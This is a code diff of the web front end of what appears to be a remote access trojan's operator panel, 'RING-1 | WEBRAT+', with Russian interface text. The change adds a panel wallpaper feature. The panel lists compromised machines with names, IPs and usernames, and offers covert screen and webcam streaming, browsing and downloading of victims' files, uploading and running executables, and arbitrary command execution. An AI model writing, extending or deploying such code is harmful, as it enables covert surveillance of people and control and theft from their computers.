@@ -7,30 +7,39 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Courier New', monospace;
-            background: #0a0a0a;
             color: #00ffcc;
-            overflow-x: hidden;
+            min-height: 100vh;
+            transition: background-image 0.3s ease;
+        }
+        body::before {
+            content: ''; position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: -1;
         }
         .header {
-            background: #000;
+            background: rgba(0,0,0,0.8); backdrop-filter: blur(10px);
             border-bottom: 1px solid #00ffcc;
             padding: 15px 30px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            position: sticky;
-            top: 0;
-            z-index: 100;
+            display: flex; justify-content: space-between; align-items: center;
+            position: sticky; top: 0; z-index: 100;
         }
-        .logo { font-size: 24px; font-weight: bold; }
-        .logout-btn { background: #ff0033; color: white; border: none; padding: 8px 20px; cursor: pointer; }
+        .logo { font-size: 24px; font-weight: bold; text-shadow: 0 0 5px #00ffcc; }
+        .header-right { display: flex; gap: 15px; align-items: center; }
+        .wallpaper-btn {
+            background: #1a1a1a; border: 1px solid #00ffcc;
+            color: #00ffcc; padding: 6px 15px; border-radius: 5px;
+            cursor: pointer; font-size: 12px;
+        }
+        .wallpaper-btn:hover { background: #00ffcc; color: black; }
+        .logout-btn { background: #ff0033; color: white; border: none; padding: 8px 20px; cursor: pointer; border-radius: 5px; }
         .container { max-width: 1600px; margin: 20px auto; padding: 0 20px; }
+        .stats {
+            display: flex; gap: 20px; margin-bottom: 20px;
+            background: rgba(0,0,0,0.5); padding: 15px; border-radius: 10px; backdrop-filter: blur(5px);
+        }
         .computers-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr)); gap: 20px; margin-bottom: 30px; }
         .computer-card {
-            background: #0a0a0a;
-            border: 1px solid #00ffcc;
-            border-radius: 8px;
-            padding: 15px;
+            background: rgba(10,10,10,0.85); backdrop-filter: blur(5px);
+            border: 1px solid #00ffcc; border-radius: 8px; padding: 15px;
         }
         .computer-header { display: flex; justify-content: space-between; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 10px; }
         .status { padding: 2px 8px; border-radius: 4px; font-size: 11px; background: #00cc88; color: black; }
@@ -38,102 +47,94 @@
         .computer-info p { font-size: 12px; margin: 4px 0; }
         .action-buttons { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 15px; }
         .action-btn {
-            background: #1a1a1a;
-            border: 1px solid #00ffcc;
-            color: #00ffcc;
-            padding: 5px 10px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 11px;
+            background: #1a1a1a; border: 1px solid #00ffcc; color: #00ffcc;
+            padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 11px;
         }
         .action-btn:hover { background: #00ffcc; color: black; }
-        
-        /* Модальное окно стрима */
         .stream-modal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0,0,0,0.98);
-            z-index: 1000;
-            flex-direction: column;
+            display: none; position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%; background: rgba(0,0,0,0.98);
+            z-index: 1000; flex-direction: column;
         }
         .stream-header { background: #000; padding: 15px; display: flex; justify-content: space-between; border-bottom: 1px solid #00ffcc; }
         .stream-video { flex: 1; display: flex; justify-content: center; align-items: center; }
         .stream-video video { max-width: 100%; max-height: 90vh; border: 2px solid #00ffcc; background: #000; }
         .close-stream { background: #ff0033; color: white; border: none; padding: 10px 20px; cursor: pointer; }
-        
-        /* Файловый менеджер */
         .filemodal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0,0,0,0.95);
-            z-index: 1000;
+            display: none; position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000;
         }
         .filemodal-content {
-            width: 90%;
-            max-width: 1000px;
-            margin: 50px auto;
-            background: #0a0a0a;
-            border: 2px solid #00ffcc;
-            border-radius: 10px;
-            padding: 20px;
-            max-height: 80vh;
-            overflow: auto;
+            width: 90%; max-width: 1000px; margin: 50px auto;
+            background: #0a0a0a; border: 2px solid #00ffcc;
+            border-radius: 10px; padding: 20px; max-height: 80vh; overflow: auto;
         }
         .filemodal-header { display: flex; justify-content: space-between; margin-bottom: 20px; }
         .file-list { margin-top: 20px; }
         .file-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 8px;
-            border-bottom: 1px solid #333;
-            cursor: pointer;
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 8px; border-bottom: 1px solid #333; cursor: pointer;
         }
         .file-item:hover { background: #1a1a1a; }
         .file-name { color: #00ffcc; }
         .file-size { font-size: 11px; color: #888; }
-        .file-actions button { background: none; border: 1px solid #00ffcc; color: #00ffcc; padding: 2px 8px; margin-left: 5px; cursor: pointer; font-size: 10px; }
+        .file-actions button {
+            background: none; border: 1px solid #00ffcc; color: #00ffcc;
+            padding: 2px 8px; margin-left: 5px; cursor: pointer; font-size: 10px;
+        }
         .path-bar { margin-bottom: 20px; display: flex; gap: 10px; }
         .path-bar input { flex: 1; background: #1a1a1a; border: 1px solid #00ffcc; color: #00ffcc; padding: 8px; }
         .loading { text-align: center; padding: 30px; color: #00ffcc; }
+        .panel-wallpaper-modal {
+            display: none; position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%; background: rgba(0,0,0,0.95);
+            z-index: 1100; justify-content: center; align-items: center;
+        }
+        .panel-wallpaper-content {
+            background: #0a0a0a; border: 2px solid #00ffcc;
+            border-radius: 10px; padding: 30px; width: 500px; max-width: 90%;
+        }
+        .panel-wallpaper-content h3 { margin-bottom: 20px; color: #00ffcc; }
+        .panel-wallpaper-content input, .panel-wallpaper-content select {
+            width: 100%; padding: 10px; margin: 10px 0;
+            background: #1a1a1a; border: 1px solid #00ffcc; color: #00ffcc;
+        }
+        .wallpaper-preview { margin: 15px 0; text-align: center; }
+        .wallpaper-preview img { max-width: 100%; max-height: 200px; border: 1px solid #00ffcc; }
+        .wallpaper-buttons { display: flex; gap: 10px; margin-top: 20px; }
+        .wallpaper-buttons button { flex: 1; padding: 10px; cursor: pointer; border: none; border-radius: 5px; }
+        .btn-primary { background: #00ffcc; color: black; }
+        .btn-danger { background: #ff0033; color: white; }
     </style>
     <script src="/socket.io/socket.io.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/simple-peer@9.11.0/simplepeer.min.js"></script>
 </head>
-<body>
+<body id="mainBody">
 <div id="app">
     <div class="header">
-        <div class="logo">🔷 RING-1 | WEBRAT</div>
-        <button class="logout-btn" onclick="logout()">EXIT</button>
+        <div class="logo">🔷 RING-1 | WEBRAT+</div>
+        <div class="header-right">
+            <button class="wallpaper-btn" onclick="openPanelWallpaperModal()">🖼️ Сменить фон панели</button>
+            <button class="logout-btn" onclick="logout()">EXIT</button>
+        </div>
     </div>
     <div class="container">
-        <div style="margin-bottom: 20px;">
-            <span id="onlineCount" style="color: #00ffcc;">0</span> online / <span id="totalCount">0</span> total
+        <div class="stats">
+            <span>🟢 Онлайн: <span id="onlineCount">0</span></span>
+            <span>📡 Всего: <span id="totalCount">0</span></span>
         </div>
         <div class="computers-grid" id="computersContainer">Loading...</div>
     </div>
 </div>
 
 <div id="streamModal" class="stream-modal">
-    <div class="stream-header">
-        <span id="streamTitle">📺 STREAM</span>
-        <button class="close-stream" onclick="stopStream()">✕ CLOSE</button>
-    </div>
-    <div class="stream-video">
-        <video id="streamVideo" autoplay playsinline muted></video>
-    </div>
+    <div class="stream-header"><span id="streamTitle">📺 STREAM</span><button class="close-stream" onclick="stopStream()">✕ CLOSE</button></div>
+    <div class="stream-video"><video id="streamVideo" autoplay playsinline muted></video></div>
 </div>
 
 <div id="fileModal" class="filemodal">
     <div class="filemodal-content">
-        <div class="filemodal-header">
-            <h3>📁 FILE MANAGER</h3>
-            <button onclick="closeFileModal()" style="background:#ff0033; color:white; border:none; padding:5px 15px;">✕</button>
-        </div>
+        <div class="filemodal-header"><h3>📁 FILE MANAGER</h3><button onclick="closeFileModal()" style="background:#ff0033; color:white; border:none; padding:5px 15px;">✕</button></div>
         <div class="path-bar">
             <input type="text" id="currentPath" value="C:\\">
             <button onclick="loadFileList()">📂 GO</button>
@@ -143,204 +144,181 @@
     </div>
 </div>
 
+<div id="panelWallpaperModal" class="panel-wallpaper-modal">
+    <div class="panel-wallpaper-content">
+        <h3>🎨 Сменить фон панели управления</h3>
+        <select id="panelWallpaperType">
+            <option value="url">Изображение по URL</option>
+            <option value="upload">Загрузить изображение</option>
+            <option value="color">Сплошной цвет</option>
+            <option value="preset">Готовый пресет</option>
+        </select>
+        <div id="panelUrlDiv"><input type="text" id="panelWallpaperUrl" placeholder="https://example.com/image.jpg"></div>
+        <div id="panelUploadDiv" style="display:none;"><input type="file" id="panelWallpaperFile" accept="image/*"></div>
+        <div id="panelColorDiv" style="display:none;"><input type="color" id="panelWallpaperColor" value="#0a0a0a"></div>
+        <div id="panelPresetDiv" style="display:none;">
+            <select id="panelWallpaperPreset" style="width:100%;">
+                <option value="cyber">🔷 Киберпространство</option>
+                <option value="matrix">💚 Матрица</option>
+                <option value="sunset">🌇 Закат</option>
+                <option value="forest">🌲 Лес</option>
+                <option value="ocean">🌊 Океан</option>
+                <option value="dark">⬛ Чистый чёрный</option>
+            </select>
+        </div>
+        <div class="wallpaper-preview" id="panelWallpaperPreview"></div>
+        <div class="wallpaper-buttons"><button class="btn-primary" onclick="applyPanelWallpaper()">ПРИМЕНИТЬ</button><button class="btn-danger" onclick="closePanelWallpaperModal()">ОТМЕНА</button></div>
+    </div>
+</div>
+
 <script>
-    let socket = null;
-    let currentComputerIdForFiles = null;
-    let currentStreamComputerId = null;
-    let currentSessionId = null;
-    let peer = null;
+    let socket = null, currentComputerIdForFiles = null, currentStreamComputerId = null, currentSessionId = null, peer = null, panelWallpaperFileBase64 = null;
     
-    async function checkAuth() {
-        const resp = await fetch('/api/user');
-        if (!resp.ok) window.location.href = '/login.html';
+    async function loadPanelWallpaper() {
+        try { const resp = await fetch('/api/panel/wallpaper'); if(resp.ok){ const d=await resp.json(); if(d.wallpaper) applyWallpaperToBody(d.wallpaper.type, d.wallpaper.data); } } catch(e){}
     }
-    
-    function connectSocket() {
-        socket = io({ transports: ['websocket'] });
-        socket.on('webrtc_signal', async (data) => {
-            if (data.signal && peer) await peer.signal(data.signal);
-        });
+    function applyWallpaperToBody(type, data) {
+        const body = document.getElementById('mainBody');
+        if(type==='url'||type==='upload'){ body.style.backgroundImage=`url(${data})`; body.style.backgroundSize='cover'; body.style.backgroundPosition='center'; body.style.backgroundAttachment='fixed'; }
+        else if(type==='color'){ body.style.backgroundImage='none'; body.style.backgroundColor=data; }
     }
-    
-    async function loadComputers() {
-        const resp = await fetch('/api/computers');
-        const comps = await resp.json();
-        document.getElementById('onlineCount').innerText = comps.filter(c => c.status === 'online').length;
-        document.getElementById('totalCount').innerText = comps.length;
-        const container = document.getElementById('computersContainer');
-        if (comps.length === 0) { container.innerHTML = '<div style="color:#00ffcc; text-align:center;">NO AGENTS ONLINE</div>'; return; }
-        container.innerHTML = comps.map(c => `
-            <div class="computer-card">
-                <div class="computer-header">
-                    <span>🖥️ ${c.computerName}</span>
-                    <span class="status ${c.status === 'online' ? '' : 'offline'}">${c.status === 'online' ? 'ONLINE' : 'OFFLINE'}</span>
-                </div>
-                <div class="computer-info">
-                    <p>🆔 ${c.computerId.substring(0, 12)}... | 💻 ${c.os} | 🌐 ${c.ip}</p>
-                    <p>👤 ${c.username} | 🕐 ${new Date(c.lastSeen).toLocaleTimeString()}</p>
-                </div>
-                <div class="action-buttons">
-                    <button class="action-btn" onclick="startScreenStream('${c.computerId}')">📺 SCREEN</button>
-                    <button class="action-btn" onclick="startWebcamStream('${c.computerId}')">🎥 WEBCAM</button>
-                    <button class="action-btn" onclick="openFileManager('${c.computerId}')">📁 FILES</button>
-                    <button class="action-btn" onclick="sendCommandPrompt('${c.computerId}')">⚡ CMD</button>
-                </div>
-            </div>
-        `).join('');
+    async function checkAuth(){ const resp=await fetch('/api/user'); if(!resp.ok)window.location.href='/login.html'; else loadPanelWallpaper(); }
+    function connectSocket(){ socket=io({transports:['websocket']}); socket.on('webrtc_signal',async(d)=>{ if(d.signal&&peer) await peer.signal(d.signal); }); }
+    async function loadComputers(){
+        const resp=await fetch('/api/computers'), comps=await resp.json();
+        document.getElementById('onlineCount').innerText=comps.filter(c=>c.status==='online').length;
+        document.getElementById('totalCount').innerText=comps.length;
+        const cont=document.getElementById('computersContainer');
+        if(comps.length===0){ cont.innerHTML='<div style="color:#00ffcc;text-align:center;">NO AGENTS ONLINE</div>'; return; }
+        cont.innerHTML=comps.map(c=>`<div class="computer-card"><div class="computer-header"><span>🖥️ ${c.computerName}</span><span class="status ${c.status==='online'?'':'offline'}">${c.status==='online'?'ONLINE':'OFFLINE'}</span></div><div class="computer-info"><p>🆔 ${c.computerId.substring(0,12)}... | 💻 ${c.os} | 🌐 ${c.ip}</p><p>👤 ${c.username} | 🕐 ${new Date(c.lastSeen).toLocaleTimeString()}</p></div><div class="action-buttons"><button class="action-btn" onclick="startScreenStream('${c.computerId}')">📺 SCREEN</button><button class="action-btn" onclick="startWebcamStream('${c.computerId}')">🎥 WEBCAM</button><button class="action-btn" onclick="openFileManager('${c.computerId}')">📁 FILES</button><button class="action-btn" onclick="sendCommandPrompt('${c.computerId}')">⚡ CMD</button></div></div>`).join('');
     }
-    
-    // === СТРИМИНГ ===
-    async function startScreenStream(computerId) {
-        currentStreamComputerId = computerId;
-        document.getElementById('streamTitle').innerHTML = `📺 SCREEN: ${computerId}`;
-        document.getElementById('streamModal').style.display = 'flex';
-        const resp = await fetch(`/api/stream/screen/${computerId}`, { method: 'POST' });
-        if (resp.ok) {
-            const data = await resp.json();
-            currentSessionId = data.sessionId;
-            initWebRTC(data.sessionId, computerId);
-        } else alert('Stream failed');
+    async function startScreenStream(id){
+        currentStreamComputerId=id; document.getElementById('streamTitle').innerHTML=`📺 SCREEN: ${id}`;
+        document.getElementById('streamModal').style.display='flex';
+        const resp=await fetch(`/api/stream/screen/${id}`,{method:'POST'});
+        if(resp.ok){ const d=await resp.json(); currentSessionId=d.sessionId; initWebRTC(d.sessionId,id); } else alert('Stream failed');
     }
-    
-    async function startWebcamStream(computerId) {
-        currentStreamComputerId = computerId;
-        document.getElementById('streamTitle').innerHTML = `🎥 WEBCAM: ${computerId}`;
-        document.getElementById('streamModal').style.display = 'flex';
-        const resp = await fetch(`/api/stream/webcam/${computerId}`, { method: 'POST' });
-        if (resp.ok) {
-            const data = await resp.json();
-            currentSessionId = data.sessionId;
-            initWebRTC(data.sessionId, computerId);
-        } else alert('Stream failed');
+    async function startWebcamStream(id){
+        currentStreamComputerId=id; document.getElementById('streamTitle').innerHTML=`🎥 WEBCAM: ${id}`;
+        document.getElementById('streamModal').style.display='flex';
+        const resp=await fetch(`/api/stream/webcam/${id}`,{method:'POST'});
+        if(resp.ok){ const d=await resp.json(); currentSessionId=d.sessionId; initWebRTC(d.sessionId,id); } else alert('Stream failed');
     }
-    
-    function initWebRTC(sessionId, computerId) {
-        if (peer) peer.destroy();
-        peer = new SimplePeer({ initiator: true, trickle: false });
-        socket.emit('join_stream', sessionId);
-        peer.on('signal', (signal) => { socket.emit('panel_signal', { computerId, signal }); });
-        peer.on('stream', (stream) => { document.getElementById('streamVideo').srcObject = stream; });
-        peer.on('error', () => alert('WebRTC error'));
+    function initWebRTC(sid,cid){
+        if(peer) peer.destroy();
+        peer=new SimplePeer({initiator:true,trickle:false});
+        socket.emit('join_stream',sid);
+        peer.on('signal',s=>socket.emit('panel_signal',{computerId:cid,signal:s}));
+        peer.on('stream',s=>document.getElementById('streamVideo').srcObject=s);
+        peer.on('error',()=>alert('WebRTC error'));
     }
-    
-    async function stopStream() {
-        if (currentSessionId) await fetch(`/api/stream/stop/${currentSessionId}`, { method: 'POST' });
-        if (peer) peer.destroy();
-        document.getElementById('streamModal').style.display = 'none';
-        const video = document.getElementById('streamVideo');
-        if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
+    async function stopStream(){
+        if(currentSessionId) await fetch(`/api/stream/stop/${currentSessionId}`,{method:'POST'});
+        if(peer) peer.destroy();
+        document.getElementById('streamModal').style.display='none';
+        const v=document.getElementById('streamVideo'); if(v.srcObject) v.srcObject.getTracks().forEach(t=>t.stop());
     }
-    
-    // === ФАЙЛОВЫЙ МЕНЕДЖЕР ===
-    function openFileManager(computerId) {
-        currentComputerIdForFiles = computerId;
-        document.getElementById('currentPath').value = 'C:\\';
-        document.getElementById('fileModal').style.display = 'block';
-        loadFileList();
+    function openFileManager(id){ currentComputerIdForFiles=id; document.getElementById('currentPath').value='C:\\'; document.getElementById('fileModal').style.display='block'; loadFileList(); }
+    function closeFileModal(){ document.getElementById('fileModal').style.display='none'; }
+    async function loadFileList(){
+        const p=document.getElementById('currentPath').value;
+        document.getElementById('fileListContainer').innerHTML='<div class="loading">Loading...</div>';
+        const resp=await fetch(`/api/files/list/${currentComputerIdForFiles}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({path:p})});
+        if(resp.ok){ const d=await resp.json(); renderFileList(d.files); }
+        else document.getElementById('fileListContainer').innerHTML='<div class="loading">ERROR</div>';
     }
-    
-    function closeFileModal() { document.getElementById('fileModal').style.display = 'none'; }
-    
-    async function loadFileList() {
-        const path = document.getElementById('currentPath').value;
-        document.getElementById('fileListContainer').innerHTML = '<div class="loading">Loading...</div>';
-        const resp = await fetch(`/api/files/list/${currentComputerIdForFiles}`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ path })
-        });
-        if (resp.ok) {
-            const data = await resp.json();
-            renderFileList(data.files);
-        } else {
-            document.getElementById('fileListContainer').innerHTML = '<div class="loading">ERROR loading directory</div>';
-        }
+    function renderFileList(files){
+        const cont=document.getElementById('fileListContainer');
+        if(!files||files.length===0){ cont.innerHTML='<div class="loading">Empty</div>'; return; }
+        cont.innerHTML=files.map(f=>`<div class="file-item" ondblclick="navigateTo('${f.path}')"><span class="file-name">${f.isDir?'📁':'📄'} ${f.name}</span><span class="file-size">${f.isDir?'DIR':f.size}</span><div class="file-actions">${!f.isDir?`<button onclick="downloadFile('${f.path}')">⬇️ DOWNLOAD</button><button onclick="executeFile('${f.path}')">▶️ RUN</button>`:''}</div></div>`).join('');
     }
-    
-    function renderFileList(files) {
-        const container = document.getElementById('fileListContainer');
-        if (!files || files.length === 0) { container.innerHTML = '<div class="loading">Empty directory</div>'; return; }
-        container.innerHTML = files.map(f => `
-            <div class="file-item" ondblclick="navigateTo('${f.path}')">
-                <span class="file-name">${f.isDir ? '📁' : '📄'} ${f.name}</span>
-                <span class="file-size">${f.isDir ? 'DIR' : f.size}</span>
-                <div class="file-actions">
-                    ${!f.isDir ? `<button onclick="downloadFile('${f.path}')">⬇️ DOWNLOAD</button>` : ''}
-                    ${!f.isDir ? `<button onclick="executeFile('${f.path}')">▶️ RUN</button>` : ''}
-                </div>
-            </div>
-        `).join('');
+    function navigateTo(p){ document.getElementById('currentPath').value=p; loadFileList(); }
+    async function downloadFile(fp){
+        const resp=await fetch(`/api/files/download/${currentComputerIdForFiles}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({filePath:fp})});
+        if(resp.ok){ const d=await resp.json(); const a=document.createElement('a'); a.href=`data:application/octet-stream;base64,${d.data}`; a.download=d.filename; a.click(); }
+        else alert('Download failed');
     }
-    
-    function navigateTo(path) { document.getElementById('currentPath').value = path; loadFileList(); }
-    
-    async function downloadFile(filePath) {
-        const resp = await fetch(`/api/files/download/${currentComputerIdForFiles}`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ filePath })
-        });
-        if (resp.ok) {
-            const data = await resp.json();
-            const a = document.createElement('a');
-            a.href = `data:application/octet-stream;base64,${data.data}`;
-            a.download = data.filename;
-            a.click();
-        } else alert('Download failed');
-    }
-    
-    function uploadFileToComputer() {
-        const input = document.createElement('input');
-        input.type = 'file';
-        input.onchange = async (e) => {
-            const file = e.target.files[0];
-            const reader = new FileReader();
-            reader.onload = async (ev) => {
-                const base64 = ev.target.result.split(',')[1];
-                const formData = new FormData();
-                formData.append('file', file);
-                formData.append('remotePath', document.getElementById('currentPath').value);
-                const resp = await fetch(`/api/files/upload/${currentComputerIdForFiles}`, {
-                    method: 'POST',
-                    body: formData
-                });
-                if (resp.ok) { alert('Uploaded!'); loadFileList(); }
-                else alert('Upload failed');
+    function uploadFileToComputer(){
+        const inp=document.createElement('input'); inp.type='file';
+        inp.onchange=async(e)=>{
+            const file=e.target.files[0], reader=new FileReader();
+            reader.onload=async(ev)=>{
+                const base64=ev.target.result.split(',')[1], fd=new FormData();
+                fd.append('file',file); fd.append('remotePath',document.getElementById('currentPath').value);
+                const resp=await fetch(`/api/files/upload/${currentComputerIdForFiles}`,{method:'POST',body:fd});
+                if(resp.ok){ alert('Uploaded!'); loadFileList(); } else alert('Upload failed');
             };
             reader.readAsDataURL(file);
         };
-        input.click();
+        inp.click();
     }
-    
-    async function executeFile(filePath) {
-        if (!confirm(`Execute ${filePath}?`)) return;
-        const resp = await fetch(`/api/files/execute/${currentComputerIdForFiles}`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ filePath })
-        });
-        if (resp.ok) { const data = await resp.json(); alert(data.output || 'Executed'); }
-        else alert('Execute failed');
+    async function executeFile(fp){
+        if(!confirm(`Execute ${fp}?`)) return;
+        const resp=await fetch(`/api/files/execute/${currentComputerIdForFiles}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({filePath:fp})});
+        if(resp.ok){ const d=await resp.json(); alert(d.output||'Executed'); } else alert('Execute failed');
     }
-    
-    async function sendCommandPrompt(computerId) {
-        const cmd = prompt('Enter command:');
-        if (!cmd) return;
-        const resp = await fetch(`/api/command/${computerId}`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ command: cmd })
-        });
-        if (resp.ok) { const data = await resp.json(); alert(data.output || 'Command executed'); }
-        else alert('Command failed');
+    async function sendCommandPrompt(id){
+        const cmd=prompt('Enter command:'); if(!cmd) return;
+        const resp=await fetch(`/api/command/${id}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:cmd})});
+        if(resp.ok){ const d=await resp.json(); alert(d.output||'Command executed'); } else alert('Command failed');
     }
-    
-    async function logout() { await fetch('/api/logout', { method: 'POST' }); window.location.href = '/login.html'; }
-    
-    checkAuth();
-    connectSocket();
-    setInterval(loadComputers, 10000);
-    loadComputers();
+    function openPanelWallpaperModal(){
+        document.getElementById('panelWallpaperModal').style.display='flex';
+        document.getElementById('panelWallpaperType').value='url';
+        document.getElementById('panelUrlDiv').style.display='block';
+        document.getElementById('panelUploadDiv').style.display='none';
+        document.getElementById('panelColorDiv').style.display='none';
+        document.getElementById('panelPresetDiv').style.display='none';
+        document.getElementById('panelWallpaperUrl').value='';
+        document.getElementById('panelWallpaperFile').value='';
+        document.getElementById('panelWallpaperColor').value='#0a0a0a';
+        document.getElementById('panelWallpaperPreview').innerHTML='';
+        panelWallpaperFileBase64=null;
+        document.getElementById('panelWallpaperType').onchange=function(){
+            const v=this.value;
+            document.getElementById('panelUrlDiv').style.display=v==='url'?'block':'none';
+            document.getElementById('panelUploadDiv').style.display=v==='upload'?'block':'none';
+            document.getElementById('panelColorDiv').style.display=v==='color'?'block':'none';
+            document.getElementById('panelPresetDiv').style.display=v==='preset'?'block':'none';
+            if(v==='color') document.getElementById('panelWallpaperPreview').innerHTML=`<div style="width:100%;height:100px;background:${document.getElementById('panelWallpaperColor').value};border:1px solid #00ffcc;"></div>`;
+            else document.getElementById('panelWallpaperPreview').innerHTML='';
+        };
+        document.getElementById('panelWallpaperFile').onchange=function(e){
+            const f=e.target.files[0];
+            if(f){ const r=new FileReader(); r.onload=function(ev){ panelWallpaperFileBase64=ev.target.result; document.getElementById('panelWallpaperPreview').innerHTML=`<img src="${ev.target.result}" style="max-width:100%;max-height:150px;">`; }; r.readAsDataURL(f); }
+        };
+        document.getElementById('panelWallpaperColor').onchange=function(){
+            document.getElementById('panelWallpaperPreview').innerHTML=`<div style="width:100%;height:100px;background:${this.value};border:1px solid #00ffcc;"></div>`;
+        };
+        document.getElementById('panelWallpaperPreset').onchange=function(){
+            const presets={'cyber':'https://images.unsplash.com/photo-1550745165-9bc0b252726f?w=1920','matrix':'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1920','sunset':'https://images.unsplash.com/photo-1495616811223-4d98c6e9c869?w=1920','forest':'https://images.unsplash.com/photo-1448375240586-882707db888b?w=1920','ocean':'https://images.unsplash.com/photo-1505118380757-91f5f5632de0?w=1920','dark':''};
+            const p=this.value;
+            if(p==='dark') document.getElementById('panelWallpaperPreview').innerHTML='<div style="width:100%;height:100px;background:black;border:1px solid #00ffcc;"></div>';
+            else document.getElementById('panelWallpaperPreview').innerHTML=`<img src="${presets[p]}" style="max-width:100%;max-height:150px;">`;
+        };
+    }
+    function closePanelWallpaperModal(){ document.getElementById('panelWallpaperModal').style.display='none'; }
+    async function applyPanelWallpaper(){
+        const type=document.getElementById('panelWallpaperType').value;
+        let wdata=null;
+        if(type==='url'){ const url=document.getElementById('panelWallpaperUrl').value; if(!url){ alert('Введите URL'); return; } wdata={type:'url',data:url}; }
+        else if(type==='upload'){ if(!panelWallpaperFileBase64){ alert('Выберите изображение'); return; } wdata={type:'upload',data:panelWallpaperFileBase64}; }
+        else if(type==='color'){ wdata={type:'color',data:document.getElementById('panelWallpaperColor').value}; }
+        else if(type==='preset'){
+            const presets={'cyber':'https://images.unsplash.com/photo-1550745165-9bc0b252726f?w=1920','matrix':'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1920','sunset':'https://images.unsplash.com/photo-1495616811223-4d98c6e9c869?w=1920','forest':'https://images.unsplash.com/photo-1448375240586-882707db888b?w=1920','ocean':'https://images.unsplash.com/photo-1505118380757-91f5f5632de0?w=1920','dark':''};
+            const p=document.getElementById('panelWallpaperPreset').value;
+            if(p==='dark') wdata={type:'color',data:'#000000'};
+            else wdata={type:'url',data:presets[p]};
+        }
+        const resp=await fetch('/api/panel/wallpaper',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(wdata)});
+        if(resp.ok){
+            if(wdata.type==='upload') applyWallpaperToBody('url',wdata.data);
+            else applyWallpaperToBody(wdata.type,wdata.data);
+            closePanelWallpaperModal(); alert('✅ Фон панели изменён');
+        } else alert('❌ Ошибка');
+    }
+    async function logout(){ await fetch('/api/logout',{method:'POST'}); window.location.href='/login.html'; }
+    checkAuth(); connectSocket(); setInterval(loadComputers,10000); loadComputers();
 </script>
 </body>
 </html>
